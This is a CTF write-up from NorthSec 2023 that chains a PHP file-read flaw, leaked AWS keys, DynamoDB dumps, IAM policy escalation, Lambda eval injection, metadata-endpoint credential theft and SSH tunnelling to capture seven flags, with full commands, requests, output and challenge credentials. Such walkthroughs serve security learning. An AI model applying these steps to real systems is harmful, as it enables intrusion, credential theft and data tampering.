---
layout: post
title: NorthSec 2023 Writeup - Annual Review
date: 2023-05-22
type: post
tags:
- Writeup
- Hacking
- NorthSec
- CTF
permalink: /2023/05/NorthSec/AnnualReview
img: 2023/05/NorthSec/AnnualReview/Description.png
---

This track was really fun. It started by a simple web exploit, and continued with lots of AWS. I started doing it alone, but quickly had some teammates work with me on solving the different flags. It had seven flags for a total of 15 points.

These challenges forced us to work as a team, and that was really cool. The only downside is that this writeup will not be complete as some parts were done on my teammates laptop and I don't have notes for everything.

```
Website: http://3.235.99.89:8080/employee-review/
Username: 120875ABAB
Password: Dl70sKany8fDRKoopoBF
```

## Flag 1

I opened the employee review site in a browser.

![Login](/assets/images/2023/05/NorthSec/AnnualReview/Login.png "Login")

I connected with the provided credentials.

![Review](/assets/images/2023/05/NorthSec/AnnualReview/Review.png "Review")

The link to read the annual review guide was interesting. 

![Guide](/assets/images/2023/05/NorthSec/AnnualReview/Guide.png "Guide")

I looked at the page URL, it had a `file` parameter that looked like it could allow me to read arbitrary files. I tried reading `/etc/passwd` and using PHP filters to read the source code. That failed.

Then I tried to use it to read the PHP files directly. I did not think it would work, but it did.

```http
GET /employee-review/preview.php?file=app.php HTTP/1.1
Host: 3.235.99.89:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: PHPSESSID=bdf62268bae108de589ce91428cda1b6
Upgrade-Insecure-Requests: 1
```


```http
HTTP/1.1 200 OK
Server: nginx/1.23.4
Date: Sat, 20 May 2023 19:33:21 GMT
Content-Type: text/plain;charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/8.1.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2495

<?php
  require_once('libs/utils.php');

  if (!is_auth())
    redirect('index.php');

  $db = new Db();
  if (str_starts_with($_SESSION['employee_id'], "hr_")) {
    $reviews = $db->get_reviews();
  } else {
    $reviews = $db->get_review($_SESSION['employee_id']);
    $employeeReview = $reviews[0]['Review']['N'];
    if ($employeeReview > 5) {
      $review_message = get_exceptional_employee_message();
    }
  }
?>
....

```

I used this vulnerability to extract all the PHP files I could find.

The file `libs/dynamo.php` was interesting.

```php
<?php
  // flag-d19650aa911acb7c130aa380601d169d3bd08ab4
  require_once('aws/aws-autoloader.php');

  class Db {
    private $tblLogin = 'GOD_LoginEmployee';
    private $tblReview = 'GOD_ReviewEmployee';
    private $db;
    
    function __construct() {
      $sdk = new Aws\Sdk([
        'region'   => 'us-east-1',
        'version'  => 'latest',
        'credentials' => [
          'key'    => 'AKIAZL2EUAABYDJOSKF6',
          'secret' => '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',
        ]
      ]);

      $this->db = $sdk->createDynamoDb();
    }
```

It contained the first flag. I submitted it, and saw that the track had a total of seven flags.

```bash
$ askgod submit flag-d19650aa911acb7c130aa380601d169d3bd08ab4                                     
Congratulations, you score your team 1 points!
Message: Maybe with HR credentials, I could do something about my score. (1/7)
```

## Flag 2

We used the AWS credentials from the PHP code to connect AWS cli.

The code in the file made it clear that those credentials allowed interacting with DynamoDB. 

We used it to extract the list of employees. 

```bash
$ aws dynamodb scan --table-name GOD_LoginEmployee | jq .
{
  "Items": [
    {
      "EmployeeId": {
        "S": "939932RQJX"
      },
      "Password": {
        "S": "SrNHmWWglvKub58H2rJF"
      }
    },
    {
      "EmployeeId": {
        "S": "516152CDSK"
      },
      "Password": {
        "S": "BhbsoPTwqmLwhqvs4u84"
      }
    },
    {
      "EmployeeId": {
        "S": "328757EQYH"
      },
      "Password": {
        "S": "dAMiVJaw5z1TS66O3lcD"
      }
    },
    ...
    {
      "EmployeeId": {
        "S": "hr_642494JRHC"
      },
      "Password": {
        "S": "flag-9add6a1bb1cde15c378eacbacd720efc69501967"
      }
    },
    {
      "EmployeeId": {
        "S": "120875ABAB"
      },
      "Password": {
        "S": "Dl70sKany8fDRKoopoBF"
      }
    }
  ],
  "Count": 13,
  "ScannedCount": 13,
  "ConsumedCapacity": null
}
```

The second flag was in the HR user's password.

```bash
$ askgod submit flag-9add6a1bb1cde15c378eacbacd720efc69501967                                             
Congratulations, you score your team 2 points!
Message: What can I retrieve as HR now? (2/7)
```

## Flag 3

We used the same credentials to read the review table.

```bash
aws dynamodb scan --table-name GOD_ReviewEmployee > reviews.json
```

```json
...
    {
      "EmployeeId": {
        "S": "864040VQNZ"
      },
      "Comment": {
        "S": "Mediocre"
      },
      "Review": {
        "N": "1"
      }
    },
    {
      "EmployeeId": {
        "S": "978273KULS"
      },
      "Comment": {
        "S": "You have written solid documentation! https://mod-a854a8410c7b4c22-gods3corporationbucket-p1fnqxqagspr.s3.amazonaws.com/infrastructure.md"
      },
      "Review": {
        "N": "4"
      }
    },
...
```

One of the reviews had a link to some documentation on the infrastructure. We looked at the file, it had lots of interesting documentation to help continue with the challenges. It also had a flag on the first line.

```md
# 978273KULS' Infrastructure Documentation (flag-7fa969573c3ff2190e892095166cf71635eca0be)
```

## Flag 4

The documentation file also had a new set of credentials and some documentation on how to use them to view our permissions.

```md
## Configuration
To easily handle the use of multiple access tokens, define profiles in your credentials. Begin by adding a profile for the service account like so:

`vim ~/.aws/credentials`

[svc_iam]
aws_access_key_id=AKIAZL2EUAAB6GSHCZV7
aws_secret_access_key=9r1qnq4bTNIOBH1L2cL8bqtZhiBpJiT4fpXbrkQh
region=us-east-1

You can validate that the profile is functional by using the following command:

`aws sts get-caller-identity --profile svc_iam`

When successful, the command returns the user ID, the account ID and the user's ARN.

## Permissions
Execute the next command to retrieve the service account's privileges:

`aws iam get-user-policy --user-name GOD_svc_iam --policy-name GOD_IAM_Management --profile svc_iam`

## To Keep in Mind
* All AWS resources created by G.O.D. are recognizable by the prefix `GOD_` or the string `god` in their name. This allows to quickly identify G.O.D. resources when a command also returns resources created by default (e.g. roles).
```

We used the credentials and documentation to see what we could do.

```bash
$ aws sts get-caller-identity | jq .
{
  "UserId": "AIDAZL2EUAAB37ASHD3GG",
  "Account": "643852140547",
  "Arn": "arn:aws:iam::643852140547:user/GOD_svc_iam"
}


aws iam get-user-policy --user-name GOD_svc_iam --policy-name GOD_IAM_Management --profile svc_iam
{
  "UserName": "GOD_svc_iam",
  "PolicyName": "GOD_IAM_Management",
  "PolicyDocument": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Action": [
          "iam:ListRoles",
          "iam:ListPolicies",
          "iam:ListPolicyVersion",
          "iam:ListRolePolicies",
          "iam:ListAttachedRolePolicies",
          "iam:ListAttachedUserPolicies",
          "iam:ListAttachedGroupPolicies",
          "iam:GetPolicy",
          "iam:GetPolicyVersion",
          "iam:GetRolePolicy",
          "iam:GetUserPolicy"
        ],
        "Resource": "*",
        "Effect": "Allow"
      }
    ]
  }
}
```

We had permission to read lots of information, but not change anything. We spent some time looking at all the entities we had access to.

We found a role that we were able to assume.

```json
{
    "Path": "/",
    "RoleName": "GOD_IAM-Manager-Role",
    "RoleId": "AROAZL2EUAABSAVQ7KEL5",
    "Arn": "arn:aws:iam::643852140547:role/GOD_IAM-Manager-Role",
    "CreateDate": "2023-05-19T00:12:52+00:00",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "AWS": "arn:aws:iam::643852140547:user/GOD_svc_iam"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "Description": "",
    "MaxSessionDuration": 3600
},
```

We assumed the role to see if we would have additional permissions.

```bash
$ aws --profile svc_iam sts assume-role --role-arn arn:aws:iam::643852140547:role/GOD_IAM-Manager-Role  --role-session-name test  | cat
{
    "Credentials": {
        "AccessKeyId": "ASIAZL2EUAAB7KOLVMP2",
        "SecretAccessKey": "XJHsbV9X9SKnRJcdBozW28Irmkk1n6eM1Q+SA0gE",
        "SessionToken": "IQoJb3JpZ2luX2VjEG4aCXVzLWVhc3QtMSJGMEQCIFC6LeQQ4Y+t4Tf1A+B7zwvVvaYWHCI28pQKN06Qi3MdAiA3nSTADk6ZDw/IdyE8qklA3oARSL41XbASoyq114hN4SqaAgiW//////////8BEAAaDDY0Mzg1MjE0MDU0NyIMh6dn5Bp/wgJreTfVKu4B3Zdv/5iNGS24AWO1U0FbLVGwfYYUe2I7n0fnKInUTHh1a1+dsGGczoL5eXZ16sHqK5Ydl26X4OM3EAZCsgFrHWvoZTmb1FV7JJnZqM8GvNSUc77NdhYQypnqFcZmxVhE+z4KVTKGU4XSKUEOdGdTzKRQMw13Di3pXvnI9DHmpf/w6rn2LND04CM+lOlINa1HHdDVEwxuiLFJ4V5a/9Tz5Q2TUwoJGF+6mm77FcsxqoCpI38rUOnMPxQPjN97lHvwQY+yS1hyG867jpPSNyj1iOJM+oZKGXqbEi6Jarnh3jDvLsLiZ+Y0/V3fiqsCxjDG76SjBjqeATiWUsTj3WCZniaHH7q+QSilPJw++RaLSDeN6awfjeKoTH4bTQMgZUS2M80yYf3BVMcXbGin0MAH7sWhqJ/OUk0XON3vxARhK4ik5hU3/lWUz8y7ycmFKN4vPmWhDvkJz4steacvpFLaRmOgMNNyrvSDiOEB9qU7tZhbNQ64sFu1ZdA27rlEHg/YnyIswHmH2Ka6ZtbUCFJqNKZhvrfa",
        "Expiration": "2023-05-20T22:12:38+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAZL2EUAABSAVQ7KEL5:test",
        "Arn": "arn:aws:sts::643852140547:assumed-role/GOD_IAM-Manager-Role/test"
    }
}
```

Then we looked at what we could do with that role.

```bash
$ aws --profile svc_iam iam list-role-policies --role-name GOD_IAM-Manager-Role | jq .
{
  "PolicyNames": [
    "GOD_AttachCustomPolicies"
  ]
}
```

The name of the policy hinted at being able to attach policies. When we extracted the policies, we saw one that allowed executing lambdas.

```bash
$ aws iam get-policy-version --policy-arn arn:aws:iam::643852140547:policy/GOD_CustomDebugEmployeeReview --version-id v1 | jq .

{
  "PolicyVersion": {
    "Document": {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Action": [
            "lambda:InvokeFunction",
            "lambda:GetFunction"
          ],
          "Resource": "arn:aws:lambda:us-east-1:643852140547:function:GOD_DebugEmployeeApp",
          "Effect": "Allow"
        }
      ]
    },
    "VersionId": "v1",
    "IsDefaultVersion": true,
    "CreateDate": "2023-05-19T00:12:44+00:00"
  }
}
```

We attached that policy to our user.

```bash
aws iam attach-user-policy --user-name GOD_svc_iam --policy-arn arn:aws:iam::643852140547:policy/GOD_CustomDebugEmployeeReview
```

And then used it to extract the lambda

```bash
aws --profile svc_iam lambda get-function --function-name GOD_DebugEmployeeApp > getfunction.json 
```

The lambda had a function to extract the private key. The function had the fourth flag in a comment.

```python
def get_private_key():
  # flag-5aac692710f20e627fc5792d9c06f958238d0f51
  client = boto3.client('secretsmanager', region_name='us-east-1')
  response = client.get_secret_value(SecretId='arn:aws:secretsmanager:us-east-1:643852140547:secret:GOD_EmployeeAppDebugKey-u6f0bi')
  secret = json.loads(response['SecretString'])
  key = secret['private']
  return 200, key
```

## Flag 5

We could execute the lambda. So we started to look at how we could run it, and what it did.

```python
def main(event):
  code, output = process_command(event)
  return {
    'statusCode': code,
    'body': json.dumps(output)
  }

def lambda_handler(event, texcont):
  try:
    return main(event)
  except:
    return {'statusCode': 500}

def process_command(event):
  command = event['command']

  if (command == "STATUS"):
    return 200, "Everything is running smoothly"

  elif (command == "TEATIME"):
    return 418, "Want some tea?"

  elif (command == "DEBUG"):
    return debug(event['debug_cmd'])

  # Working but disabled for now
  # elif (command == "SSH_KEY"):
  #  return get_private_key()

  # Working but disabled for now
  # elif (command == "SSH_USAGE"):
  #  return get_ssh_usage()

  else:
      return 404, "command not found"
```

We needed to pass a command to run. With some research we figured that we could pass the data as a base64 encoded JSON. We tried running the status command.

```bash
$ echo -n '{ "command": "STATUS" }' | base64
eyAiY29tbWFuZCI6ICJTVEFUVVMiIH0=

$ aws --profile svc_iam lambda invoke --function-name GOD_DebugEmployeeApp --payload 'eyAiY29tbWFuZCI6ICJTVEFUVVMiIH0=' test

$ cat test                     
{"statusCode": 200, "body": "\"Everything is running smoothly\""}%
```

It worked. There was a command to get a private key, but the command was commented out.

There was also a debug command.

```python
def debug(cmd):
  output = str(eval(cmd))
  output_length = len(output)
  if (output_length > 200):
    msg = "Output is too big, we are trying to save bandwitdh : %s characters" % output_length
    return 507, msg
  else:
    return 200, output
```

This was using `eval` on whatever we sent in `debug_cmd`. We used it to call `get_private_key`.

```bash
$ echo -n '{ "command": "DEBUG", "debug_cmd": "get_private_key()" }' | base64                                                                                       
eyAiY29tbWFuZCI6ICJERUJVRyIsICJkZWJ1Z19jbWQiOiAiZ2V0X3ByaXZhdGVfa2V5KCkiIH0=

$ aws --profile svc_iam lambda invoke --function-name GOD_DebugEmployeeApp --payload 'eyAiY29tbWFuZCI6ICJERUJVRyIsICJkZWJ1Z19jbWQiOiAiZ2V0X3ByaXZhdGVfa2V5KCkiIH0=' test

$ cat test 
{"statusCode": 507, "body": "\"Output is too big, we are trying to save bandwitdh : 425 characters\""}
```

Sadly the output was too long, we had to extract it 200 characters at the time. We tried getting the first 200 chars.

```bash
$ echo -n '{ "command": "DEBUG", "debug_cmd": "get_private_key()[1][0:200]" }' | base64 -w0                                                                                        
eyAiY29tbWFuZCI6ICJERUJVRyIsICJkZWJ1Z19jbWQiOiAiZ2V0X3ByaXZhdGVfa2V5KClbMV1bMDoyMDBdIiB9

$ aws --profile svc_iam lambda invoke --function-name GOD_DebugEmployeeApp --payload 'eyAiY29tbWFuZCI6ICJERUJVRyIsICJkZWJ1Z19jbWQiOiAiZ2V0X3ByaXZhdGVfa2V5KClbMV1bMDoyMDBdIiB9' test

$ cat test 
{"statusCode": 200, "body": "\"-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACAla0eWsP2cCH4MZBAPaCe3KCY/cR4xVVeQItU2N1LjiwAAAJgXeepnF3nqZwAAAAtzc2gtZWQyNTUxO\""}➜  AnnualReview 
```

It worked, but doing it manually was annoying. One of my teammate wrote a script to extract the entire key. Now we had a username from the architecture document, and private key. But we did not know the server we could connect to. It took us way too long, but eventually we remembered that we had an IP from the initial website. We tried connecting to it.

```bash
$ ssh -i private.key -p 56987 debug_6B3daAdd@3.235.99.89   
Linux 2526a0979567 5.15.0-1028-aws #32-Ubuntu SMP Mon Jan 9 12:28:07 UTC 2023 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat May 20 22:29:11 2023 from 45.45.148.196

$ ls
flag.txt  status.sh

$ cat flag.txt
flag-b3e3a5a9f911e5bce45feea39bd9691d9b947ab3
```

It worked, and we got the fifth flag.

## Flag 6

This flag was entirely done by my teammate, so I have some missing parts. The server had a status script that read from the AWS meta-data. 

```bash
$ cat status.sh
#!/bin/bash

echo "==================================="
echo "EC2 Instance Maintenance Scheduled"
echo "==================================="
maintenances=$(curl -s http://169.254.169.254/latest/meta-data/events/maintenance/scheduled)
if [ "$maintenances" = "[]" ]; then
    echo No maintenance scheduled
else
    echo The next scheduled maintenances are: $maintenances
fi
echo

echo "==================================="
echo "Employee App Status"
echo "==================================="
curl -s http://employeeapp/status.php
echo
echo

echo "==================================="
echo "Manager App Status"
echo "==================================="
curl -s http://managerapp/status.php
echo
echo
```

We use the same technique to read the credentials.

```bash
debug_6B3daAdd@2526a0979567:~$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/GOD_Ec2Role
{
  "Code" : "Success",
  "LastUpdated" : "2023-05-20T21:46:45Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAZL2EUAAB2ZRN7IU7",
  "SecretAccessKey" : "FdhsglUKSWST6IKjcojntMqlsNQP3HT/r/9Wc1pc",
  "Token" : "IQoJb3JpZ2luX2VjEG4aCXVzLWVhc3QtMSJHMEUCICRGXeTdu7takLeNaOXKykC3e81POfTcBXALYsxab7qyAiEApLBItyuQvhojQW5dxpeD7lVwX+aV/3u+1FVc0Plp9GsqxAUIl///////////ARAAGgw2NDM4NTIxNDA1NDciDJIualWmPzae17Xl+iqYBSx1ja+/mgi2yeAMc5mj2zV3Nbukijj5UkKoDFaJ4KNfloXtp6RhcHERgMDyejChFcibPXvSSZkcnyY/H9g6oolx+1m9z3Ltd8XQ0zitqF7vcwxjlKxQypvGX4T7p6gYqyABM1tFFfUtoRSytkPZXaf0TlpooJ1RYqsSETdNXkalwVl2Fki/nzIGdPfiocqGlYL6gqK4F5/pO+9/92z40DZIxYOA3IeGXsZIqznIilDmcPciw3zwjLbzw/R97oAx3RMU3PPYzhruRIpgO5FMop6+gvUK+pF2fNh4O1IKKJhOWPnjr8RWU7ShdD9lZn3gVxAxDljKyWeHDNWHCN9opymfZ9/RR2x7mhAJhKs0f+Z8ji/4AfikaPzl24v6uTJE+ePJQwRAYYkO1SpK44vWIAaNVPTu9MuAAAdvfuMcNvTRco0KpYG8usuJvPdw3wIUO8LujqJgf5a70j7nW+hRg11WIhfgwUs4xMLuBiVWIiMaF0hXEasTIZONPkwNnAOQhbRcsj4Q6efJoJdCDhsw1Apn1P2oRQl4EEdUESI9w8YnsAGVZ2GVp3UkUr3MeI623gYagj7xgIk+OMXzQvTjzRgj7dtJmRENIoqXEZj/AndSHYmrGYVVJU47Cft/yReyqmp/aNdp8xrnV/5af15ZgqvzZ3ObUiPvXZSwOIXeVoI/883hFzlNbxRj7f7i+ZogJgQqwGiD4LplnanXyeDPJSycUn7SSWy3fFqLEBadM3qoDrHDlilaLYFEygUQq7ZqBVKoM2a38ddUrz7pXj0vhVGRZ5UBG0GeVKyZGu0FbnwORn//q4foNv9fXJYvT4gmWysK9hrlLE9gcApDlbpzlLY8/aOKpmJX9rqfONaF2GQIceNMs9pOmukw4P+kowY6sQGY9lcIYVEsXcfk8UQ7ZTMK+CoUL12qoH3BcZXl/nZ+/JI+AvKdtZnMwy6S/umMG/fvBWydn6AL4THlOZWhqysBHq5v3sp4GmYI1t3EcqmcoKA8lIahT3n86KmNAkyyFdFDusz0VGeO0ZfXOcShl5MnvL9x3oU6UxEDC4juVc13DkVhYinNXZG0wcA1dfroGB5XGwvr5Yq7tUlQcyVSboIObquxumg2LYOOYrqF6cOGFCo=",
  "Expiration" : "2023-05-21T04:14:42Z"
}
```

Then we used those credentials to read another SSH key from the AWS Secret Manager. 

We created an SSH tunnel to be able to reach the `managerapp` server that we had found in the status script. And then used the new private key to connect to it.

```bash
$ ssh -i private.key -p 56987 debug_6B3daAdd@3.235.99.89 -L 4321:managerapp:22
Last login: Sat May 20 22:58:56 2023 from 45.45.148.196
```

The new server contained the sixth flag.

## Flag 7

At the very beginning of the track, we saw that employees that had reviews with a score higher than five had access to the content of a file.

```php
$reviews = $db->get_review($_SESSION['employee_id']);
$employeeReview = $reviews[0]['Review']['N'];
if ($employeeReview > 5) {
  $review_message = get_exceptional_employee_message();
}

function get_exceptional_employee_message() {
  return file_get_contents("/opt/message.txt");
}
```

On the new server, there was another application with different DynamoDB credentials.

```php
<?php                                         
                                                    
require_once('aws/aws-autoloader.php');
                                                                                                        
class Db {                 
  private $tblLogin = 'GOD_LoginManager';
  private $tblReview = 'GOD_ReviewEmployee';
  private $db;                 
          
  function __construct() {
    $sdk = new Aws\Sdk([              
      'region'   => 'us-east-1',                                                                       
      'version'  => 'latest',        
      'credentials' => [        
        'key'    => 'AKIAZL2EUAABY5WZMDFE',
        'secret' => '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',
      ]                               
```

We used those credentials the modify the review of the original application user to 6.

```bash
aws --profile dynamo --region us-east-1 dynamodb update-item \
    --table-name GOD_ReviewEmployee \
    --key '{ "EmployeeId": {"S": "120875ABAB"}}' \
    --update-expression "SET Review = :newval" \
    --expression-attribute-values '{":newval":{"N":"6"}}' \
    --return-values ALL_NEW
```

We reloaded the application. And got the last flag.

![Last Flag](/assets/images/2023/05/NorthSec/AnnualReview/LastFlag.png "Last Flag")

## Path to All Flags

This was a great track. We had lots of fun doing it. The challenge designer published a graph that shows the path to get all the flags.

![Full Path](/assets/images/2023/05/NorthSec/AnnualReview/FullPath.png "Full Path")